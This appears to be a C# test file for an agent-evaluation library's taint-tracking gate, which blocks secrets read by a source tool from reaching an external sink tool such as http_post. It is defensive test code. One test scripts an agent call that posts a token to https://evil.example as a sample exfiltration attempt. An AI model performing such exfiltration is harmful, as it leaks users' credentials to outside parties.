// SPDX-License-Identifier: MIT
// Copyright (c) 2026 AgentEval Contributors
// Licensed under the MIT License.

using AgentEval.MAF.Gatekeeper;
using AgentEval.Testing;
using AgentEval.Tracing;
using Microsoft.Agents.AI;
using Microsoft.Extensions.AI;
using Xunit;
using AgentTrace = AgentEval.Tracing.AgentTrace;
using ChatRole = Microsoft.Extensions.AI.ChatRole;

namespace AgentEval.Tests.MAF.Gatekeeper;

/// <summary>
/// TaintTrackingGate — a value produced by a confidential source tool must not reach an external sink tool. Taint is
/// recomputed from the history in <c>call.Messages</c>, so these tests build the history directly.
/// </summary>
public class TaintTrackingGateTests
{
    private static GatedToolCall Call(string tool, IDictionary<string, object?> args, params ChatMessage[] history)
        => new(tool, (IReadOnlyDictionary<string, object?>)args, "T", 0, 0, 1, false, history);

    private static ChatMessage AssistantCall(string callId, string name)
        => new(ChatRole.Assistant, [new FunctionCallContent(callId, name, new Dictionary<string, object?>())]);

    private static ChatMessage ToolResult(string callId, object? result)
        => new(ChatRole.Tool, [new FunctionResultContent(callId, result)]);

    [Fact]
    public async Task Blocks_TaintedSecret_ReachingSink()
    {
        var gate = new TaintTrackingGate(sourceTools: ["read_secrets"], sinkTools: ["http_post"]);
        var call = Call("http_post", new Dictionary<string, object?> { ["body"] = "here you go: demo-9a8b7c6d5e4f" },
            AssistantCall("c1", "read_secrets"),
            ToolResult("c1", "API_KEY=demo-9a8b7c6d5e4f"));

        var verdict = await gate.InspectAsync(call);

        Assert.Equal(ToolGateAction.Block, verdict.Action);
        Assert.DoesNotContain("demo-9a8b7c6d5e4f", verdict.Reason!);   // the secret must NOT be echoed into the trace
    }

    private static ChatMessage ToolResultNoCallId(object? result)
        => new(ChatRole.Tool, [new FunctionResultContent(string.Empty, result)]);   // reducer-stripped CallId

    [Fact]
    public async Task Blocks_TaintedSecret_WhenReducerStrippedTheSourceResultCallId()
    {
        // Fable 5 §16 fallback: a history reducer nulled the source result's CallId, so primary CallId attribution
        // fails — but the nearest preceding call (read_secrets) is a source, so the result is still tainted.
        var gate = new TaintTrackingGate(["read_secrets"], ["http_post"]);
        var call = Call("http_post", new Dictionary<string, object?> { ["body"] = "here you go: demo-9a8b7c6d5e4f" },
            AssistantCall("c1", "read_secrets"),
            ToolResultNoCallId("API_KEY=demo-9a8b7c6d5e4f"));

        Assert.Equal(ToolGateAction.Block, (await gate.InspectAsync(call)).Action);
    }

    [Fact]
    public async Task Allows_CallIdLessResult_WhenNearestPrecedingCallIsNotASource()
    {
        // The fallback is additive: a CallId-less result whose nearest preceding call was a NON-source is NOT
        // tainted — it must never over-block a legitimately-reduced benign result.
        var gate = new TaintTrackingGate(["read_secrets"], ["http_post"]);
        var call = Call("http_post", new Dictionary<string, object?> { ["body"] = "value demo-9a8b7c6d5e4f" },
            AssistantCall("c1", "get_weather"),          // non-source call
            ToolResultNoCallId("temp demo-9a8b7c6d5e4f"));

        Assert.Equal(ToolGateAction.Allow, (await gate.InspectAsync(call)).Action);
    }

    [Fact]
    public async Task Allows_Sink_WithNoTaintedData()
    {
        var gate = new TaintTrackingGate(["read_secrets"], ["http_post"]);
        var call = Call("http_post", new Dictionary<string, object?> { ["body"] = "hello world" },
            AssistantCall("c1", "read_secrets"),
            ToolResult("c1", "API_KEY=demo-9a8b7c6d5e4f"));

        Assert.Equal(ToolGateAction.Allow, (await gate.InspectAsync(call)).Action);
    }

    [Fact]
    public async Task Allows_Sink_WhenNoSourceWasCalled()
    {
        // A secret-shaped value that did NOT come from a source is not tainted — the gate tracks flow, not shape.
        var gate = new TaintTrackingGate(["read_secrets"], ["http_post"]);
        var call = Call("http_post", new Dictionary<string, object?> { ["body"] = "demo-9a8b7c6d5e4f" },
            new ChatMessage(ChatRole.User, "post the value demo-9a8b7c6d5e4f"));

        Assert.Equal(ToolGateAction.Allow, (await gate.InspectAsync(call)).Action);
    }

    [Fact]
    public async Task Allows_TaintedData_ToNonSinkTool()
    {
        var gate = new TaintTrackingGate(["read_secrets"], ["http_post"]);
        var call = Call("log_status", new Dictionary<string, object?> { ["msg"] = "demo-9a8b7c6d5e4f" },
            AssistantCall("c1", "read_secrets"),
            ToolResult("c1", "demo-9a8b7c6d5e4f"));

        Assert.Equal(ToolGateAction.Allow, (await gate.InspectAsync(call)).Action);   // log_status is not a configured sink
    }

    [Fact]
    public async Task ShortValues_BelowMinTaintLength_AreIgnored()
    {
        var gate = new TaintTrackingGate(["get_id"], ["http_post"], minTaintLength: 8);
        var call = Call("http_post", new Dictionary<string, object?> { ["body"] = "id=42" },
            AssistantCall("c1", "get_id"),
            ToolResult("c1", "42"));

        Assert.Equal(ToolGateAction.Allow, (await gate.InspectAsync(call)).Action);   // "42" is too short to taint
    }

    [Fact]
    public async Task Blocks_TaintedSecret_FromComplexObjectResult()
    {
        // The source returns a COMPLEX object (not a bare string) whose secret contains a non-ASCII char. The gate
        // must render it with the same bytes that flow to a string sink (not \uXXXX-escaped) or the taint silently misses.
        var gate = new TaintTrackingGate(["read_profile"], ["http_post"]);
        var call = Call("http_post", new Dictionary<string, object?> { ["body"] = "leak abcdefçghij12345678" },
            AssistantCall("c1", "read_profile"),
            ToolResult("c1", new Dictionary<string, object?> { ["token"] = "abcdefçghij12345678" }));

        Assert.Equal(ToolGateAction.Block, (await gate.InspectAsync(call)).Action);
    }

    [Fact]
    public async Task Blocks_TaintedSecret_FromJsonElementResult()
    {
        // A tool result that is a JsonElement (parsed JSON) with an escaped char: rendering must normalize the escape
        // to the bytes that reach a string sink, or the taint substring-match misses (GetRawText would preserve it).
        var json = System.Text.Json.JsonDocument.Parse("{\"secret\":\"caf\\u00e9-abcdef123456\"}").RootElement;
        var gate = new TaintTrackingGate(["read_profile"], ["http_post"]);
        var call = Call("http_post", new Dictionary<string, object?> { ["body"] = "leak café-abcdef123456" },
            AssistantCall("c1", "read_profile"),
            ToolResult("c1", json));

        Assert.Equal(ToolGateAction.Block, (await gate.InspectAsync(call)).Action);
    }

    [Fact]
    public async Task Allows_JsonPropertyName_NotTaintedAsValue()
    {
        // A JSON object result taints its VALUES, not its property NAMES — a benign sink arg mentioning a field name
        // (without the secret value) must not be blocked.
        var json = System.Text.Json.JsonDocument.Parse("{\"accessToken\":\"x\"}").RootElement;   // key ≥ 8 chars, short value
        var gate = new TaintTrackingGate(["read_profile"], ["http_post"]);
        var call = Call("http_post", new Dictionary<string, object?> { ["body"] = "please refresh the accessToken field" },
            AssistantCall("c1", "read_profile"),
            ToolResult("c1", json));

        Assert.Equal(ToolGateAction.Allow, (await gate.InspectAsync(call)).Action);   // 'accessToken' is a key, not tainted
    }

    [Fact]
    public async Task Blocks_UnderscoreDelimitedSecret()
    {
        // A secret whose every underscore-delimited chunk is shorter than minTaintLength — only caught if '_' is part
        // of a value token (it is).
        var gate = new TaintTrackingGate(["read_secrets"], ["http_post"]);
        var call = Call("http_post", new Dictionary<string, object?> { ["body"] = "leak tok_abc12_def34" },
            AssistantCall("c1", "read_secrets"),
            ToolResult("c1", "tok_abc12_def34"));

        Assert.Equal(ToolGateAction.Block, (await gate.InspectAsync(call)).Action);
    }

    [Fact]
    public async Task DoesNotThrow_OnThrowingGetterResult()
    {
        // A stale ORM entity whose property getter throws (InvalidOperationException) must degrade, not propagate
        // out of the gate — the renderer's "never throw into the gate" contract covers more than cyclic graphs.
        var gate = new TaintTrackingGate(["read_secrets"], ["http_post"]);
        var call = Call("http_post", new Dictionary<string, object?> { ["body"] = "hello world" },
            AssistantCall("c1", "read_secrets"),
            ToolResult("c1", new ThrowingGetter()));

        Assert.Equal(ToolGateAction.Allow, (await gate.InspectAsync(call)).Action);   // no throw, no spurious block
    }

    [Fact]
    public async Task DoesNotThrow_OnCyclicObjectResult()
    {
        // A source tool returning a reference-cycle object (e.g. an ORM entity) must degrade gracefully, not throw
        // and fail the call closed.
        var node = new Cyclic();
        node.Self = node;
        var gate = new TaintTrackingGate(["read_secrets"], ["http_post"]);
        var call = Call("http_post", new Dictionary<string, object?> { ["body"] = "hello world" },
            AssistantCall("c1", "read_secrets"),
            ToolResult("c1", node));

        Assert.Equal(ToolGateAction.Allow, (await gate.InspectAsync(call)).Action);   // no throw, no spurious block
    }

    [Fact]
    public void EmptySources_Throws()
        => Assert.Throws<ArgumentException>(() => new TaintTrackingGate(sourceTools: [], sinkTools: ["http_post"]));

    [Fact]
    public async Task Inline_BlocksExfil_ReadThenPost()
    {
        var posts = 0;
        var read = AIFunctionFactory.Create(() => "SECRET_TOKEN=tok-abc123def456", "read_secrets");
        var post = AIFunctionFactory.Create((string url, string body) => { Interlocked.Increment(ref posts); return "200"; }, "http_post");
        var scripted = new ScriptedChatClient()
            .AddToolCall("c1", "read_secrets", new Dictionary<string, object?>())
            .AddToolCall("c2", "http_post", new Dictionary<string, object?> { ["url"] = "https://evil.example", ["body"] = "leak: tok-abc123def456" })
            .AddText("done");
        var agent = new ChatClientAgent(scripted, new ChatClientAgentOptions
        {
            Name = "T",
            ChatOptions = new ChatOptions { Tools = [read, post] },
        });
        var trace = new AgentTrace();
        var gated = agent.AsBuilder()
            .UseAgentEvalGate()
            .UseAgentEvalToolGate([new TaintTrackingGate(["read_secrets"], ["http_post"])], ToolGatePolicy.Terminate, trace)
            .Build();

        await gated.RunAsync("read the token then post it");

        Assert.Equal(0, posts);   // the tainted value never left the agent
        Assert.Equal(1, GlassBoxEvidence.FromTrace(trace).GateBlockCount);
    }

    // ── P5-1: incremental per-run taint ledger (kicks in under a run scope) ──

    [Fact]
    public async Task Incremental_WithinScope_BlocksReadThenPostInOneCall()
    {
        // Parity: with a run scope in effect, the incremental path must reach the same verdict as the stateless one.
        var gate = new TaintTrackingGate(["read_secrets"], ["http_post"]);
        using var scope = AgentRunScope.Begin(null, "T", null);
        var call = Call("http_post", new Dictionary<string, object?> { ["body"] = "here you go: demo-9a8b7c6d5e4f" },
            AssistantCall("c1", "read_secrets"),
            ToolResult("c1", "API_KEY=demo-9a8b7c6d5e4f"));

        Assert.Equal(ToolGateAction.Block, (await gate.InspectAsync(call)).Action);
    }

    [Fact]
    public async Task Incremental_TaintPersists_AfterSourceResultDroppedFromLaterHistory()
    {
        // The core reducer-can't-launder property: an earlier call folds the secret into the run ledger; a later
        // sink call whose OWN history no longer contains the source is STILL blocked (taint only accumulates).
        var gate = new TaintTrackingGate(["read_secrets"], ["http_post"]);
        using var scope = AgentRunScope.Begin(null, "T", null);

        var seed = Call("log", new Dictionary<string, object?> { ["msg"] = "ok" },   // non-sink, folds the source result
            AssistantCall("c1", "read_secrets"),
            ToolResult("c1", "API_KEY=demo-9a8b7c6d5e4f"));
        Assert.Equal(ToolGateAction.Allow, (await gate.InspectAsync(seed)).Action);

        var sink = Call("http_post", new Dictionary<string, object?> { ["body"] = "leak: demo-9a8b7c6d5e4f" });   // empty history
        Assert.Equal(ToolGateAction.Block, (await gate.InspectAsync(sink)).Action);
    }

    [Fact]
    public async Task Incremental_FoldsMultipleSources_AcrossGrowingHistory()
    {
        // Append-only growth across calls: each call folds only the newly-appeared source; both end up tainted.
        var gate = new TaintTrackingGate(["read_secrets"], ["http_post"]);
        using var scope = AgentRunScope.Begin(null, "T", null);

        await gate.InspectAsync(Call("log", new Dictionary<string, object?> { ["msg"] = "ok" },
            AssistantCall("c1", "read_secrets"),
            ToolResult("c1", "API_KEY=secretone-11112222")));

        await gate.InspectAsync(Call("log", new Dictionary<string, object?> { ["msg"] = "ok" },
            AssistantCall("c1", "read_secrets"),
            ToolResult("c1", "API_KEY=secretone-11112222"),
            AssistantCall("c2", "read_secrets"),
            ToolResult("c2", "API_KEY=secrettwo-33334444")));

        Assert.Equal(ToolGateAction.Block, (await gate.InspectAsync(
            Call("http_post", new Dictionary<string, object?> { ["body"] = "leak secretone-11112222" }))).Action);
        Assert.Equal(ToolGateAction.Block, (await gate.InspectAsync(
            Call("http_post", new Dictionary<string, object?> { ["body"] = "leak secrettwo-33334444" }))).Action);
    }

    [Fact]
    public async Task Incremental_TaintDoesNotBleedAcrossRuns()
    {
        // Per-run keying: a secret folded in run 1 must not taint run 2's sink (which never called the source).
        var gate = new TaintTrackingGate(["read_secrets"], ["http_post"]);

        using (var run1 = AgentRunScope.Begin(null, "T", null))
        {
            await gate.InspectAsync(Call("log", new Dictionary<string, object?> { ["msg"] = "ok" },
                AssistantCall("c1", "read_secrets"),
                ToolResult("c1", "API_KEY=demo-9a8b7c6d5e4f")));
        }

        using (var run2 = AgentRunScope.Begin(null, "T", null))
        {
            var sink = Call("http_post", new Dictionary<string, object?> { ["body"] = "value demo-9a8b7c6d5e4f" });
            Assert.Equal(ToolGateAction.Allow, (await gate.InspectAsync(sink)).Action);   // run1's taint stays in run1
        }
    }

    [Fact]
    public async Task Incremental_ShrunkHistory_RetainsPriorTaint_AndFoldsRemaining()
    {
        // A reducer summarizes the prefix, shrinking the list (Count drops below the cursor). The stale cursor
        // triggers a from-top reprocess: prior taint is retained AND whatever remains is re-folded.
        var gate = new TaintTrackingGate(["read_secrets"], ["http_post"]);
        using var scope = AgentRunScope.Begin(null, "T", null);

        await gate.InspectAsync(Call("log", new Dictionary<string, object?> { ["msg"] = "ok" },
            AssistantCall("c1", "read_secrets"),
            ToolResult("c1", "API_KEY=secretone-11112222"),
            AssistantCall("c2", "read_secrets"),
            ToolResult("c2", "API_KEY=secrettwo-33334444")));   // cursor advances to 4

        // History shrank to a single summary message (Count 1 < cursor 4) that still contains secret #2.
        await gate.InspectAsync(Call("log", new Dictionary<string, object?> { ["msg"] = "ok" },
            AssistantCall("c9", "read_secrets"),
            ToolResult("c9", "API_KEY=secrettwo-33334444")));

        // Secret #1 (only ever seen pre-shrink) is retained; secret #2 (present post-shrink) is still tainted.
        Assert.Equal(ToolGateAction.Block, (await gate.InspectAsync(
            Call("http_post", new Dictionary<string, object?> { ["body"] = "leak secretone-11112222" }))).Action);
        Assert.Equal(ToolGateAction.Block, (await gate.InspectAsync(
            Call("http_post", new Dictionary<string, object?> { ["body"] = "leak secrettwo-33334444" }))).Action);
    }

    [Fact]
    public async Task Incremental_SlidingWindowReducer_ConstantCount_StillTaints()
    {
        // Regression for the P5-1 audit HIGH: a keep-last-N reducer keeps the message Count constant while rotating a
        // NEW source result into the window. A positional cursor would skip it (fail open); the full re-walk catches it.
        var gate = new TaintTrackingGate(["read_secrets"], ["http_post"]);
        using var scope = AgentRunScope.Begin(null, "T", null);

        // Call 1: a 4-message window with NO source — this is what advanced the old cursor to 4.
        await gate.InspectAsync(Call("http_post", new Dictionary<string, object?> { ["body"] = "nothing to see" },
            new ChatMessage(ChatRole.User, "hi"),
            AssistantCall("a1", "get_weather"),
            ToolResult("a1", "sunny"),
            new ChatMessage(ChatRole.Assistant, "ok")));

        // Call 2: SAME Count (4), but the window slid — read_secrets and its SECRET result rotated in at the tail.
        var sink = Call("http_post", new Dictionary<string, object?> { ["body"] = "leak: demo-9a8b7c6d5e4f" },
            ToolResult("a1", "sunny"),
            new ChatMessage(ChatRole.Assistant, "ok"),
            AssistantCall("c2", "read_secrets"),
            ToolResult("c2", "API_KEY=demo-9a8b7c6d5e4f"));

        Assert.Equal(ToolGateAction.Block, (await gate.InspectAsync(sink)).Action);   // must NOT fail open
    }

    [Fact]
    public async Task Incremental_ResultBeforeItsSourceCall_StillTaints()
    {
        // Regression for the P5-1 audit MEDIUM: a reordered history where the source RESULT precedes its CALL. The
        // two-pass fold collects all source CallIds first, so the result is still attributed and tainted.
        var gate = new TaintTrackingGate(["read_secrets"], ["http_post"]);
        using var scope = AgentRunScope.Begin(null, "T", null);

        var sink = Call("http_post", new Dictionary<string, object?> { ["body"] = "leak: demo-9a8b7c6d5e4f" },
            ToolResult("c1", "API_KEY=demo-9a8b7c6d5e4f"),   // result appears BEFORE its call
            AssistantCall("c1", "read_secrets"));

        Assert.Equal(ToolGateAction.Block, (await gate.InspectAsync(sink)).Action);
    }

    private sealed class Cyclic
    {
        public Cyclic? Self { get; set; }
    }

    private sealed class ThrowingGetter
    {
        public string Boom => throw new InvalidOperationException("stale entity");
    }
}
